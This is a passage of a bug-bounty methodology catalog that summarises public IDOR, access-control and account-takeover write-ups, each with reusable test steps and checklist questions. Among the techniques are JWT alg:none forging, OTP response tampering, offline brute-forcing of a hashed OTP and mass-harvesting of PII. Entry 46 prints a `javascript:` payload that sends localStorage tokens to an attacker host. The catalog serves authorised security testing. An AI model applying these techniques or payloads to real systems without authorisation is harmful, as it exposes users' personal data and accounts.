- Q: "Does change-password validate the current password against the *swapped* id, or just accept it? Is admin id=1? Does the admin panel expose code/template/plugin execution to pivot to RCE?"

### [36] Join any private group by incrementing `c2mId` on invitation-accept (reusable, not single-use) — M7arm4n ($2,500) [NEW: accept-invite keyed by an enumerable group code]
- Where: `POST /GroupInvitations` body `GroupInvitations&action=A&c2mId=<groupCode>`.
- Approach/how-found: accepting a legit invite sends `c2mId`; increment/decrement it → join other private groups (comment, create topics). `c2mId` is not single-use — reusable even after a normal user accepts.
- Test: invitation/accept flows often key off an enumerable group/resource code with no membership check; increment it and confirm reusability.
- Q: "Is the accept-invite request keyed by an enumerable group/resource code not bound to *my* invite, and is it reusable?"

### [37] TikTok Shop shipping-address IDOR + reconstructing the secret id via a constant offset (`order_id + 65536`) — Muhammad Iman ($2,500) [NEW ★ derive an unknown id by arithmetic]
- Where: `POST /api/v1/shop/shipping_address/get` body `change_addr_order_id`.
- Approach/how-found: swapping `change_addr_order_id` returns the victim's name/phone/address. The hard part was *obtaining* that id — he diffed `order_id` vs `change_addr_order_id` and found a constant gap: `change_addr_order_id = order_id + 65536` (verified across many orders) → a known order_id yields the address id → enumerate.
- Test: when an object needs a non-obvious id, compute its relationship to a known id (constant offset, multiplier, shared prefix, check digit); a fixed delta across samples means the "secret" id is derivable.
- Q: "Is the hard-to-get id a deterministic function of a known id (constant offset/multiplier/prefix)? Did I diff two ids across several objects to find the pattern?"

### [38] Shopee — delete any project by swapping `shop_id` (match account type for parity) — Tengku Arya ($400) [DUP reinforcement: destructive IDOR by tenant id]
- Where: project-delete request body `{"shop_id":"<id>"}`.
- Approach/how-found: two third-party-partner accounts of the **same type** (parity matters); from account 1's delete request, swap `shop_id` 58074→58072 → deletes account 2's project (success response) → brute-force to mass-delete.
- Test: destructive actions keyed by a tenant/shop id are prime IDOR; create two parallel accounts of the *same* type/plan so request shapes match, then swap the tenant id.
- Q: "Does a delete/update take a `shop_id`/`tenant_id` swappable to another tenant? Did I match account type/plan so the requests line up?"

### [39] Instagram — submit bug reports as any user via `user_identifier`; feature revealed by mobile emulation — Faizan Wani [NEW: device-emulation surfaces hidden features + spoofable actor id]
- Where: mobile-only "Report Bug" in profile settings; `POST graph.facebook.com` with `user_identifier` = profile id.
- Approach/how-found: noticed the app exposes more options on mobile than desktop → DevTools device toolbar → iPhone view unlocked "Report Bug"; its POST carries `user_identifier`; tamper to any user's id (read off their profile) → submit reports on their behalf.
- Test: toggle mobile/device emulation (and different app versions) to surface hidden features; any report/submit/feedback action carrying an actor/user id is spoofable.
- Q: "Did I check features that only appear under mobile/device emulation? Does a report/feedback/submit action carry a spoofable `user_identifier`/actor id?"

### [40] JS source review → shared web API key = no per-user authz on `/videos/<id>/cta`; private sticker view — Mohammed Waleed [NEW ★ shared API key + source-derived endpoints + method-from-presence]
- Where: React app; frontend downloaded via "Resources Saver"; an `api/` folder revealed endpoints.
- Approach/how-found: `/v1/videos/<video_id>/cta` required only `api_key=WEB_API_KEY` — identical for ALL users (verified across accounts) → add/delete a CTA link on ANY video with no per-user check (the client chose `method: ctaText ? 'put' : 'delete'`). `/v1/videos/<id>/associations` let any account view stickers on a private video.
- Test: download the SPA source (DevTools Sources / Resources Saver), enumerate the `api/` modules, test each endpoint. A single global/web API key shared by all users is not authorization — every id-keyed endpoint behind it is IDOR-able. Watch how the client derives the HTTP method from a field's presence.
- Q: "Is there a shared/global web API key all users get (not real auth)? What endpoints does the SPA source list that the UI never calls? Does the client pick PUT vs DELETE from a field's presence?"

### [41] QuickBlox SDK: client-embedded app secrets → mass BOLA on /ID.json + chained IoT/telemed takeover — Claroty Team82 [NEW]
- Where: chat/video SDK under telemedicine, finance, IoT intercom apps.
- Approach/how-found: architecture review showed every client needs the app secrets (AUTH_KEY/SECRET/AccountKey) to mint a `QB-Token` → secrets are necessarily shipped in the app. Extracted them via reverse-engineering/Frida (even when encrypted/obfuscated). App-level token → `GET /users.json` (all users), `GET /<ID>.json` (PII by **sequential** id), `POST /users.json` (create rogue user). If owner disabled app-level listing, create a rogue user and still brute the sequential `/<ID>.json`. Chains: Rozcom intercom user_id = `BuildingID + phone` (structured) → leaked DB gave both; `getbuildingdetailpublic?buildingId=` (address), `gettenantauth?cellular=<phone>` returned the user's **static "OTP"** (reused forever) → login as anyone, open doors/cameras. Telemedicine app set every QB user's password to a **hardcoded per-role static string** → impersonate any doctor/patient, read medical records.
- Test: pull mobile/SDK secrets from the APK; hit the vendor API's list + by-id (sequential) routes; look for static OTP/passwords; decompose structured user_ids (building+phone).
- Q: "Does the mobile app ship API secrets that grant an app-level token? Is there a by-id route over sequential ids? Is the 'OTP'/password actually static? Is the user_id built from guessable parts?"

### [42] CEO ATO via a reset-confirm page that lets you set target id (`u`) and drop expiry (`x`) — Cristi Vlad (pentest) [NEW: reset-confirm parameter tampering + locate id by decrement]
- Where: reset link → confirm page URL with `u` (numeric user id) + `x` (expiry token).
- Approach/how-found: removing `x` and refreshing still worked → expiry disabled (link reusable days later). Incrementing `u` showed *another user's* email on the page; he set `u` to a second account's id (exposed in Account Settings), set a new password → logged into that account. Decremented `u` to locate the CEO (ids near 551xxxxxxx, not 1). The reset string was "encrypted" but irrelevant once the user controls the URL params at the next step.
- Test: on the reset-confirm page, tamper each param — a numeric `u`/`id` selects whose password changes; an `x`/`exp`/`ts` often only enforces expiry (drop it to reuse). The shown email confirms the target before submit.
- Q: "On reset-confirm, does a `u`/`id` param choose the account (does the displayed email change when I swap it)? Does removing an expiry param make the link reusable?"

### [43] Chamilo LMS 1.11.18 — IDOR in student work download: `main/work/download.php?id=3&cidReq=COURSE&...` only checks course enrollment, `id` is incremental → download any student's submitted work — Aituglo/Randorisec (CVE-2023-34958) [DUP-reinforce: incremental file-id, "enrolled in course" is the ONLY authz]
- Where: `GET /main/work/download.php?id=<n>&cidReq=<COURSE>&id_session=0&gidReq=0&gradebook=0&origin=` (e-learning "student publications/assignments").
- Approach/how-found: source review of an LMS; the download handler verified only that the requester follows the course, not that the work belongs to them. `id` is sequential → enumerate to pull every submission. (Same audit also yielded RCE via PPT-convert filename command injection, blind SSRF, stored XSS, and CSRF grade-change — IDOR was one link in a 5-bug chain.)
- Test: on LMS/portal "download my file/assignment/report" endpoints, check whether the only gate is coarse membership (enrolled/in-tenant) rather than per-object ownership; then increment the numeric file `id`.
- Q: "Is the download authz just 'are you in this course/tenant?' instead of 'do you own this file?' — and is the file id sequential so I can sweep all of them?"

### [44] Cockpit CMS: relational-mapping populate() resolves {_id,_model} with no authz + NoSQL type confusion — ghostccamm [NEW: ref-injection]
- Where: OSS CMS Content API (read the source in `modules/Content/bootstrap.php`).
- Approach/how-found: `populate()` auto-resolves any value containing `_id`+`_model` into the referenced object — with **zero ownership check**. Created two collections + a Link field to see the request shape, noticed `_model`/`_id` are client-supplied, and the server never validates the link type. Because storage is NoSQL/BSON, he injected `_id`+`_model` into a *non-link* field on a public collection (type confusion), then hit `?populate=1` → server fetched and returned an arbitrary model/object. (Need model name (guessable) + ObjectID — cliffhanger to part 2.)
- Test: in OSS, grep the fetch/populate/expand code for an ownership check; try smuggling a `{_id,_model}` (or `$ref`) object into any field, then trigger the populate/expand param.
- Q: "Does an ORM 'populate/expand/include' path resolve client-supplied object refs without an authz check? Can I inject a relational ref into a plain field (NoSQL type confusion) and trigger expansion?"

### [45] Pre-ATO via User-Manager email change on an invited (unregistered) user — Bharat Singh (VDP) [DUP reinforcement: change-others'-email → (pre-)ATO]
- Where: org "User Manager"; invited users show name/login/email; UI blocks editing login+email.
- Approach/how-found: intercept the edit — changing `login` failed, but changing `email` to a victim address persisted (front + back end) → pre-account-takeover: when the invited user later registers/activates, the attacker-controlled email owns the account.
- Test: UI-disabled fields are often only disabled client-side — intercept and send them anyway; changing another (esp. invited/unregistered) user's email = (pre-)ATO.
- Q: "Are 'read-only' fields (login/email/role) enforced server-side or just disabled in the UI? Can I set an invited/unregistered user's email to mine for a pre-ATO?"

### [46] NFT marketplace — IDOR by public wallet `account_address` + `javascript:` stored XSS → steal localStorage signature → ATO — pratik yadav [NEW ★ signature-in-localStorage stolen via XSS; wallet-as-id]
- Where: profile-update POST with `account_address` (wallet) + `signer` + `signature` (auth token kept in **localStorage**, not a cookie).
- Approach/how-found: (1) stored XSS: save Twitter/Instagram link as `javascript:alert(document.domain)` → fires on click. (2) IDOR: swap `account_address` to the victim's **public** wallet → edit their profile (email/socials). Chain: as the victim, set their social link to `javascript:token=JSON.stringify(localStorage);fetch(attacker+token)` → when anyone views the victim's profile (or the victim clicks), their `signature` (the real auth) is exfiltrated from localStorage → attacker signs requests to sell/transfer/delete their NFTs. (Changing email alone isn't ATO here — no email auth, wallet-based login — so the signature is the prize.)
- Test: when auth is a signature/JWT in localStorage, HttpOnly cookies don't protect it — any XSS steals it. Public identifiers (wallet/username/email) used as a write key = IDOR. Try `javascript:` URIs in link fields.
- Q: "Is the real auth token in localStorage (XSS-stealable)? Is the write keyed by a *public* identifier (wallet/username)? Do link fields allow `javascript:` URIs for stored XSS delivered via an IDOR-modified profile?"

### [47] GraphQL introspection → InQL → unauthenticated `deleteUser`/`updateUser` → admin takeover — Mahmuduzzaman Kamol [DUP reinforcement: introspection → dangerous mutations]
- Where: `/graphql` with introspection enabled.
- Approach/how-found: introspection query dumped the schema → InQL (Burp) listed mutations → `deleteUser`/`updateUser` lacked authz; used the `user(id)` query to find ids, deleted a user, then `updateUser` to reset the admin's password → login as admin.
- Test: always run introspection (or InQL / GraphQL Voyager); enumerate `delete*/update*/reset*` mutations and call them with ids from `user`/`users` queries — per-mutation authz is frequently missing.
- Q: "Is introspection on? Which `update*/delete*/reset*` mutations exist, and do they enforce per-object authz when I pass another user's id?"

### [48] Microsoft Teams: client-side 'no files to external tenants' bypassed by recipient-id IDOR → malware delivery — JUMPSEC [NEW: client-side control + cross-tenant]
- Where: `POST /v1/users/ME/conversations/<RECIPIENT_ID>/messages`.
- Approach/how-found: the "can't send files to external tenants" restriction is enforced **client-side**. Swapped the internal/external recipient ID in the POST (classic IDOR) → file delivered cross-tenant; it's hosted on a trusted SharePoint domain and appears as a file (not a link), bypassing nearly all anti-phishing controls.
- Test: any "you can't do X to an external/other party" limit — replay server-side and swap the recipient/target id; verify whether the block was only UI/client-side.
- Q: "Is this restriction enforced server-side or just client-side? If I swap the recipient/tenant id in the raw request, does the blocked action go through?"

### [49] $2,500: master ID "0" + blank UUID modifies any account — firstsight.me [NEW: master/wildcard id]
- Where: data-update API `POST id=<n>&uuid=<uuid>&email=<email>&Param1=...`.
- Approach/how-found: methodical BAC testing failed first — (a) change id only → blocked (3 identities: id+uuid+email cross-checked); (b) change id+uuid+email all to victim under attacker session → blocked (values tied to session); (c) delete id+uuid, keep email → no success; (d) POST→GET → only POST accepted. Took a break, came back and set `id=0` with a **blank uuid** + victim email → "0" behaved as a **master id** → modified any user's data (P1). Notes the analogous 2018 trick of OTP `000000` as a master code. Also a recon lesson: an API with no docs/visible endpoints sat idle for months, then later got wired into the data-update feature — revisit abandoned scopes.
- Test: when multi-identifier swaps fail, try sentinel/wildcard values on the id: `0`, `000000`, `-1`, `null`, blank — and blank out the *other* identifiers (uuid) so only the email/target remains.
- Q: "Does id=0 / 000000 / -1 / null behave as a master/wildcard that ignores ownership? If I blank the UUID and keep only email + a sentinel id, does it act on the target? Did a previously-empty API get wired up later?"

### [50] Unguessable user id (u+10 random) defeated by a Spring-Data search endpoint that leaks creator ids → 40k PII — ferferof ($1,500) [NEW ★ leak the ids via a search/list endpoint]
- Where: `/main/api/v1/users/<userId>` discloses PII but `userId` = `u`+10 random chars (62^10, unbruteforceable). Leak source: `/main/companies/search/findByNameIgnoreCaseContaining?q=<term>&limit=20` returns each company's **creator user id**.
- Approach/how-found: enumerate companies by searching all 1/2/3-letter terms → harvest creator user ids → feed each to the user-info endpoint (multi-threaded Python) → 40k PII records in 10 minutes. (An earlier IDOR attempt surfaced a SQL error, but prepared statements blocked SQLi.)
- Test: when the id is unguessable, don't brute it — find a search/list/autocomplete/export endpoint that *returns* the ids. Spring Data REST `…/search/findBy…` endpoints leak fields and ids generously; sweep them with short query terms.
- Q: "Is there a search/list/autocomplete endpoint that returns the unguessable ids (esp. Spring `findBy…`)? Can I sweep it with short terms to harvest all ids, then hit the PII endpoint?"

### [51] LinkedIn — unpin any company's posts; the required per-page `versionTag` is itself fetchable — Omar Ahmed (LinkedIn H1) [NEW: defeat an anti-tamper token by fetching it per object]
- Where: unpin request takes a company id + a `versionTag`; companies are numerically ordered.
- Approach/how-found: the unpin failed without a valid `versionTag` (looked like protection). He realized the version tag is page-specific and *retrievable* from a page URL — fetch the target company's version tag, then unpin → 200. Because company ids are sequential, he could unpin any company's posts. Found by hunting *past* what the Autorize plugin auto-detects (chasing an odd response code).
- Test: when an action needs an anti-tamper token (version/etag/nonce) tied to the object, check whether you can simply fetch that token for the target object first — a fetchable "protection" is none. Investigate the weird/unique response codes the auto-tools skip.
- Q: "Does this action need a per-object token I can fetch for the victim object first? Am I only testing what Autorize auto-flags, or chasing the odd response codes too?"

### [52] School platform — full org takeover by chaining low-priv `getUsers` BAC + role mass-assignment privesc + admin-edit IDOR — Hacktus/DreyAnd [NEW ★ role-in-body privesc + admin BAC + PUT-user IDOR]
- Where: ASP.NET API `api.redacted.com`, Basic auth, school management SaaS.
- Approach/how-found:
  1. **BAC id-harvest:** `GET /v1/admin/<org>/customers/getUsers?=*` with a **low-priv** token leaked every user's `account_id`/email/IP/role (students→teachers→admins).
  2. **Vertical privesc #1:** low-priv can't create admins, but `POST /v1/<org>/users` with `"role":"Manager"` succeeded → manager.
  3. **Vertical privesc #2:** as manager, the same POST with `"role":"Administrator"` → admin (the `role` is **mass-assignable** from the request body).
  4. **IDOR ATO:** `PUT /v1/<org>/users/<adminId>` edits any admin's `email`+`password` → take over any admin.
  5. **Impact:** `DELETE /v1/<org>/users/<id>` → delete all other admins → own the org.
- Test: hit admin/reporting endpoints with a low-priv token (BAC for id harvest). On create/update-user, set `role`/`isAdmin`/`permissions` in the body (mass assignment). Then PUT other users (esp. admins) by id to change email/password.
- Q: "Can a low-priv token reach admin list/report endpoints to harvest ids? Is `role`/`isAdmin` honored from the create/update body? Can I PUT another (admin) user by id to change their email/password?"

### [53] IDOR via JWT `userId` swap + None-alg forge + MongoDB ObjectId keyspace reduction → enumerate accounts — Mohamed reda [NEW ★ ObjectId structure brute + JWT none]
- Where: `GET /profile` with `Authorization: Bearer <JWT>` containing `userId`, `email`, `type`, `firstName`.
- Approach/how-found: JWT used HS256; the **None algorithm** worked (strip the signature) → forge arbitrary claims. `type:Customer→Admin` privesc failed, but swapping `userId` returned other users' data (IDOR). Severity looked capped because the id seemed unguessable — until he analyzed several account ids: the `userId` is a **MongoDB ObjectId** = `[8 hex unix-timestamp][12 hex machine/process, fixed for a time window][4 hex random/counter]`. Given a target's account-creation time, only the trailing hex need brute-forcing → he generated JWTs across the timestamp window × last bytes and validated via the API (bash to enumerate hex + Python to test) → recovered the triager's account/PII on demand.
- Test: if an id is a MongoDB ObjectId it is NOT random — derive the timestamp bytes from the object's creation time, fix the middle bytes from your own freshly created id, brute only the trailing counter. Pair with JWT `alg:none`/weak-secret to forge the swapped id, and also try promoting `type`/`role` claims.
- Q: "Is the id a MongoDB ObjectId (timestamp+machine+counter) reconstructable from a known creation time? Is the JWT forgeable (none-alg/weak secret) so I can swap `userId` and try elevating `type`/`role`?"

### [54] TP-Link business subdomain — manual-approval gate bypassed via forgot-password, then IDOR leaks other users' records incl. PLAINTEXT passwords — Serj Novoselov [NEW ★ "pending-approval" login lock defeated by password-reset issuing a working temp credential]
- Where: TP-Link business customer-service subdomain; registration → "account under manual review" (can't log in) → `forgot password` flow.
- Approach/how-found: fresh accounts were locked behind manual approval. Instead of waiting, he hit "forgot password" for his own pending email; the system emailed a working **temporary password** that logged him straight in — bypassing the approval gate. Once inside, an authenticated reference leaked other users' sensitive data, including plaintext-stored passwords. (Reward: just a "Thank you".)
- Test: when a new account is blocked by "pending approval/verification", try the password-reset/forgot flow — it may mint a valid credential that ignores the approval state. After getting in, probe authenticated object refs for cross-user data.
- Q: "Does forgot-password issue a usable credential even while my account is 'pending approval'? Once in, can I read another user's record (and are passwords stored/returned in plaintext)?"

### [55] "From Response to Request" — GraphQL IDOR by PROMOTING a response-only field into a query variable: getter has empty `variables`, add `($id:Int!)`+`user(id:$id)` and feed the `id` you saw in YOUR response → read any user → ATO via leaked security answer — Tom Neaves/Trustwave [NEW ★ flagship technique: the id lives in the response, so author your own variable to send it back]
- Where: profile-page GraphQL getter (`operationName: myProfile`, `current_user{ id email securityQuestion securityAnswer }`) whose `variables` block is blank by design.
- Approach/how-found: the predictable `id` only appeared in the **response**, not the request, so a naive swap was impossible. Insight: GraphQL variables are just arguments — the developer simply never sent any. He rewrote the query to declare a variable and call `user(id:$id)`, set `id` to neighbor+1, and the shared endpoint (also used by admin) happily returned the other user's email + security Q/A → forgot-password + known answer = full ATO; Intruder over `00000–99999` dumps everyone.
- Test: when the sensitive/predictable id is only in the response and the request has no such arg, don't give up — re-author the GraphQL query to add the variable and a field/resolver that accepts it (`user(id:)`, `node(id:)`); the same endpoint often backs an admin path with no per-object authz.
- Q: "Is there an id in the response that the request never sends? Can I declare it as a GraphQL variable and call a resolver (`user/node(id:)`) that the endpoint still serves to me?"

### [56] Opt-out IDOR on a legacy subdomain — `profile_id` increment leaks any user's email — Gavin K ($1,000) [DUP reinforcement: chase lonely/legacy endpoints; unsubscribe flows leak email]
- Where: a "lonely" `/opt-out/` endpoint redirected to an old subdomain with `?profile_id=<ObjectId>`.
- Approach/how-found: Burp showed nothing rendered, so he opened the odd endpoint in a browser → a legacy opt-out page; changing the last digit of `profile_id` showed a different user's email → enumerate every email + opt anyone out (interfering with their mailing/password-reset).
- Test: chase isolated/odd endpoints (opt-out, unsubscribe, preferences, legacy subdomains) — they're often old code with `profile_id`/`uid` IDORs that leak email and toggle others' notification/reset settings. Open endpoints in a browser when Burp shows a blank render.
- Q: "Do unsubscribe/opt-out/preference endpoints (especially on legacy subdomains) take a `profile_id`/`uid` I can change to read another user's email or alter their settings?"

### [57] LinkedIn (mobile site) — delete ANY post: `POST /mwlite/feed/deletePost/` change `objectUrn` (publicly visible on every post) → deletes victim's post under your session — Anand Prakash/PingSafe ($10,000) [DUP-reinforce: destructive IDOR on a public object id; mobile/lite endpoint missing authz]
- Where: `POST /mwlite/feed/deletePost/?csrfToken=...` body `{"objectUrn":"urn:li:activity:<id>"}` (the lightweight `mwlite` mobile web app).
- Approach/how-found: the delete handler on the mobile site lacked an ownership check; `objectUrn`/activity id is exposed publicly on every post, so swapping it deleted any individual's or company's post with the attacker's own session.
- Test: always re-test destructive actions (delete/archive/unpublish) on the m./mobile/lite/legacy host — auth there is often weaker than the main site; the object id (urn/activity id) is frequently public in the feed HTML/API.
- Q: "Does the mobile/lite delete endpoint check ownership of `objectUrn`/post-id, or just that I'm logged in? Is that id already public on the post?"

### [58] Django Debug page → Swagger + reused JWT → `id`-only endpoints IDOR (500+ employees PII) — Aayush Vishnoi (pentest) [NEW ★ debug-leaked endpoints + JWT reuse into Swagger]
- Where: internal subdomain on :8443 (Django DEBUG on — append `/hacker` → error page leaks 5 endpoints incl Swagger/Redoc) and :443 (login/signup).
- Approach/how-found: signed up on :443, intercepted an API call → grabbed the **JWT**, pasted it into the Swagger UI's Authorize box on :8443 → authorized to all documented endpoints. 2-3 took only an `id` → swap → PII of 500+ employees. (Recon chain: subfinder/amass/assetfinder/alterx → httpx → naabu → nuclei to find the internal host.)
- Test: force Django/Flask/Rails debug pages (junk path / error) to leak endpoints; if Swagger needs auth, sign up on the public port and reuse that JWT in Swagger's Authorize; then swap `id` on every documented endpoint.
- Q: "Is there a debug page leaking endpoints? Can I sign up on one port and reuse the JWT in Swagger on another? Which documented endpoints take just an `id`?"

### [59] Tinder: paywall/blur is frontend-only → API leaks liker ids → IDOR full profile + unblurred photos — crypt0g30rgy ($4000, dup) [NEW reinforcement: UI-only paywall]
- Where: `tinder.com/app/likes-you`; API `GET /v2/my-likes?locale=en-GB`, then `GET /user/<likerId>?locale=en-GB` on api.gotinder.com.
- Approach/how-found: free users see "who liked you" blurred behind a paywall. He noticed the blur/paywall is enforced **only in the frontend** — the underlying API returns ALL liker data including each `user_id`. With those ids, `GET /user/<likerId>` returned full profiles and the **unblurred original** images (image URLs containing the string `original`).
- Test: whenever data is blurred/locked/teased behind a paywall, read the raw API response — the full object + the ids to fetch it are often already there; image variants named `original`/`full` may be unprotected.
- Q: "Is the paywalled/blurred/premium content actually withheld server-side, or just hidden in the UI? Does the list API hand me the ids to fetch the full object directly?"

### [60] Viseca eXpense: public demo login + no-auth IDOR on statement PDFs; cardId is a red herring; id format reversed via exiftool — Pentagrid [NEW: decoy param + metadata-derived id format]
- Where: `https://www.dcalonline.com/...` PDF download `?cardId=<any valid>&visecaStatementId=<...>`.
- Approach/how-found: Viseca published a **demo login** on their site → logged in, downloaded own statement. Then realized auth wasn't even required (URL alone works). The `cardId` is a **decoy** — any valid cardId works, there's no server-side correlation to the statement; only `visecaStatementId` matters. To prove the id is guessable he ran `exiftool` on the PDF — its Create Date exactly matched the id, revealing the format = full timestamp (YYYYMMDDHHMMSS) + 6 incrementing digits (entropy ~19983–25733, a per-month batch counter). Brute → any company's credit-card statement.
- Test: try a published demo/test account; in a multi-id request, check whether one id is a no-op (only one is actually validated); reverse a structured id's format from the returned file's own metadata (exiftool/EXIF/PDF dates).
- Q: "Is there a public demo/test login as a foothold? In a 2-id request, is one id ignored (only the other checked)? Can the returned file's metadata reveal the id's timestamp+counter structure?"

### [61] Enumerable phone-verify token leaks PII + OTP-bypass via response manipulation → mass ATO — princej_76 [NEW ★ verify-link token IDOR + OTP response-tamper]
- Where: signup makes `username.xyz.com`; phone-verify email link `username.xyz.com/<token>` where token is an integer.
- Approach/how-found: increment/decrement the token → lands on *other users'* mobile-verification pages (leaks name, email, subdomain, phone) with a "verify" button. Clicking sends an OTP he can't read → he tampered the **response** in Burp (fail→success) → bypassed OTP → set a new password → ATO. Worked at scale, even on suspended accounts (reactivated via a help-center ticket). Mass ATO, no interaction.
- Test: verification/confirmation links with integer tokens are enumerable → harvest PII; when an OTP gate blocks you, try response manipulation (`false→true`, error→200) — many OTP checks trust the client-visible response.
- Q: "Is the verify/confirm link an enumerable integer token exposing others' PII? Can I bypass the OTP by editing the success flag in the response?"

### [62] Faveo Service Desk 5.0.1 (CVE-2023-24625) — IDOR by `user id` swap leaks other users' PII; and DROPPING the `client` param escalates to admin (join any org, read all tickets) — CUPC4K3 [NEW ★ parameter-removal privilege escalation: deleting a scoping param flips you to admin]
- Where: Faveo helpdesk profile/user requests; the logged-in user was referenced as id `21`; requests also carried a `client` parameter.
- Approach/how-found: authenticated as the demo client, proxied his profile request in Burp; the user was `id=21`. Swapping the id returned other users' personal data (work phone, email, mobile). Then he noticed REMOVING the `client` parameter from the request granted admin-only access — letting him add himself to other organizations and view ALL tickets (25 open + 6 closed across orgs) as an ordinary user (CWE-639).
- Test: swap the numeric user id for cross-user PII; AND try DELETING scoping/context params (`client`, `org`, `tenant`, `role`) entirely — a missing param can make the backend fall back to an unscoped/admin context. Combine id-swap + param-removal.
- Q: "Does swapping the user id leak PII? What happens if I DELETE the `client`/`org`/`tenant` param — does the server drop to an admin/unscoped view and let me join other orgs?"

### [63] Self-XSS → Stored XSS via company_id IDOR (low-priv → admin) — arben.sh [NEW: self-XSS upgrade]
- Where: create-folder request `project_id=0&parent_folder_id=7&company_id=10&folder_name=<payload>`.
- Approach/how-found: folder name unsanitized = XSS, but only the owner sees it (self-XSS). From a low-priv account he changed `company_id`/`parent_folder_id` to the ADMIN's org/folder → the malicious folder is created inside the victim org → stored XSS fires for other-org admins when they preview/move files. Guessable org ids + no WAF.
- Test: when you have a self-XSS, look for an IDOR (org/container/parent id in the create request) that lets you plant it in someone else's container.
- Q: "Is my self-XSS truly self-only, or can an IDOR (company_id/parent_id swap) store it in a victim's space so it becomes stored XSS against an admin?"

### [64] Facebook Business — datasources of any business via GraphQL `assetOwnerId`/`asset_id` (node enumeration) — Mukund Bhuva [NEW: enumerate GraphQL friendly-name nodes]
- Where: `business.facebook.com /api/graphql/`; `fb_api_req_friendly_name` / `X-Fb-Friendly-Name` selects the operation.
- Approach/how-found: found `AccountQualityHubAssetOwnerViewV2Query` parsing `{"assetOwnerId":"ID"}` → swap ID → any business owner's data. Dug deeper, enumerated related nodes → `AccountQualityDataSourceViewWrapperQuery` with `{"asset_id":"DSID"}` → read that datasource's data. No owner check on either.
- Test: on FB-style GraphQL, enumerate operations via `fb_api_req_friendly_name` (grep JS/old write-ups for query names); each query's id variable (`assetOwnerId`/`asset_id`/`pageID`) is an IDOR candidate — chain one query's output id into the next query's variable.
- Q: "What other GraphQL operations/nodes exist (friendly-name enumeration)? Does each take an owner/asset id I can swap, and can I feed one query's id into the next?"

### [66] JS-file analysis as an IDOR source (email-keyed endpoint, hidden /rmt_stage) — screamy7 [NEW reinforcement: JS sourcing]
- Approach/how-found: workflow = browse app → set scope incl. CDNs → extract all JS (Uproot-js) → grep `/api`, `POST`, `params`, `token`, `Content-Type`. In a 90k-line JS he found an endpoint that takes the **user's email** as a param to leak confidential data (IDOR). Separately, JS referenced `/rmt_stage` (un-bruteforceable word) → an internal proxy/second server → exposed CKFinder → admin pwn.
- Test: read JS for endpoints/params that take an email/id you can swap, and for non-guessable hidden paths.
- Q: "Which id/email-keyed endpoints or hidden paths appear ONLY in JS that the UI never calls for me?"

### [67] Indian EV/automotive app — `invoiceNo` IDOR on invoice download leaks PII (name, GST, address, **mobile**), chained with OTP-in-response → reset victim's password → ATO; 25,000+ invoices — Kush Jain [NEW ★ IDOR-harvested phone number feeds an OTP/response-manipulation ATO]
- Where: mobile app wallet/charging payments; "download invoice" request carrying `invoiceNo`; plus registration/reset OTP returned in the HTTP response.
- Approach/how-found: changing `invoiceNo` to another account's number downloaded their invoice (PII incl. mobile number). Separately, the app returned the OTP in the response and accepted response manipulation. Chain: enumerate `invoiceNo` → read victim's mobile from invoice → forgot-password for that number → read OTP from response → reset password silently → ATO. Enumeration yielded 25k+ invoices.
- Test: invoice/receipt/order download endpoints are PII goldmines — enumerate the doc number; if any auth/reset flow leaks OTP in the response, pivot the harvested phone/email into a full takeover.
- Q: "Can I enumerate invoice/receipt numbers to harvest victim phone/email, and does the login/reset flow leak the OTP in its response so I can chain to ATO?"

### [68] "ATO via confusion" — change email mid-reset so the reset retargets the victim — Kullai (P1, Bugcrowd) [NEW ★ reset token not bound; email change retargets the reset]
- Where: group invite + admin-triggered password reset.
- Approach/how-found: A (admin) invites B (attacker's 2nd account) into a group; A sends B a reset link; B opens it but doesn't set a password yet; A changes B's **email to the victim's**; then B submits a new password → the **victim's** password changes → login as victim. The reset session wasn't bound to the original account, so swapping the email retargeted the pending reset. Only the victim's email is needed.
- Test: begin a reset, then change the account's email *before* completing it — if the reset isn't bound to the original identity, the new password lands on whoever the email now points to.
- Q: "Is the pending reset bound to the original account or does it act on the *current* email at submit time? Can I change the email mid-reset to retarget it to a victim?"

### [69] Fintech GraphQL spend-rules — Bearer not validated + inject an undocumented `spendRuleId` to read others' rules — 0x1int ($700) [NEW: undocumented variable injection]
- Where: card spend-control "Rule Types" GraphQL; one query `FindSpendRule` backs every rule type; create via `CreateStreetAddressSpendRule(input)`.
- Approach/how-found: noticed `Authorization: Bearer` wasn't validated server-side for this feature. The docs exposed no id input, but he added `"spendRuleId":"<id>"` to the input variables anyway → the mutation/`FindSpendRule` returned another user's spend-rule data → swap the id to read any user's rules.
- Test: don't limit yourself to documented variables — inject likely id fields (`spendRuleId`/`id`/`ownerId`) into GraphQL inputs even when absent from the schema/docs; and check whether the Bearer token is actually enforced per-operation.
- Q: "Does adding an undocumented `id`/`*RuleId`/`ownerId` variable to a GraphQL input return another user's object? Is the Bearer token actually validated for this operation?"

### [70] India Sarathi Parivahan (185M PII): missing-authz-one-level-down + leaked admin feature + offline-brute client-hashed OTP → SYSADMIN — Robin Justin [NEW: several]
- Where: national driver's-license portal.
- Approach/how-found: (1) **Missing authorization one level down** — the entry endpoint authenticates, but sibling endpoints accept the same `JSESSIONID` with no further check → state/DOB/photo by application number; another endpoint maps phone+DOB → application number (enables targeting). (2) A nav-bar **"View Documents" feature that was meant to be admin-only** had leaked onto the public portal: submit an application number → it self-fetches the DOB and self-authorizes → all uploaded docs (Aadhaar/passport). (3) Admin takeover: guessed the username `SYSADMIN` on Forgot-Password. The 6-digit OTP was hashed **client-side** as `sha256(sha256(otp)+randomSalt)` with the salt sent in `randamGenNum`; the captcha and salt were **reusable** and the OTP valid **2 hours** → precompute all 10^6 hashes with a fixed salt offline, replay at ~500 req/s → reset SYSADMIN password → admin (search any citizen by name+DOB, approve licenses, dump all gov-staff PII, skip bio-verification, bypass fees).
- Test: after the "front door" auth, re-test every sibling endpoint for its own check; hunt admin-only features accidentally exposed publicly; when an OTP is hashed client-side with a client-supplied salt (and captcha/salt reusable, long validity), brute it offline; guess admin usernames (SYSADMIN/admin/root) on forgot-password.
- Q: "Do sibling endpoints recheck authz after the entry endpoint, or trust the session? Is any admin-only feature reachable on the public site? Is the OTP hashed client-side with a known/reused salt so I can brute it offline? Does forgot-password accept a guessable admin username?"

### [71] APK source → hidden `loginToken` endpoint; the token value is another endpoint's response `id` → mass PII — Vengeance [NEW: cross-endpoint id reuse + mobile-source recon]
- Where: web+mobile scope; apktool-decompiled APK revealed a URL with a `loginToken` param the web app never used.
